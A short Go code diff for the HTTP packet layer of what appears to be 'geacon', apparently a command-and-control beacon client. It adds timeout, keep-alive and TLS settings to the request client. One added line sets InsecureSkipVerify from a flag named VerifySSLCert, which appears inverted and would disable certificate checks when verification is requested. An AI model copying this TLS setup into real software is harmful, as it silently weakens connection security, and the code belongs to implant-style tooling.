@@ -1,6 +1,7 @@
 package packet
 
 import (
+	"crypto/tls"
 	"fmt"
 	"geacon/cmd/config"
 	"net/http"
@@ -12,6 +13,15 @@ import (
 var (
 	httpRequest = req.New()
 )
+
+func init() {
+	httpRequest.SetTimeout(config.TimeOut * time.Second)
+	trans, _ := httpRequest.Client().Transport.(*http.Transport)
+	trans.MaxIdleConns = 20
+	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
+	trans.DisableKeepAlives = true
+	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
+}
 
 //TODO c2profile
 func HttpPost(url string, data []byte) *req.Resp {
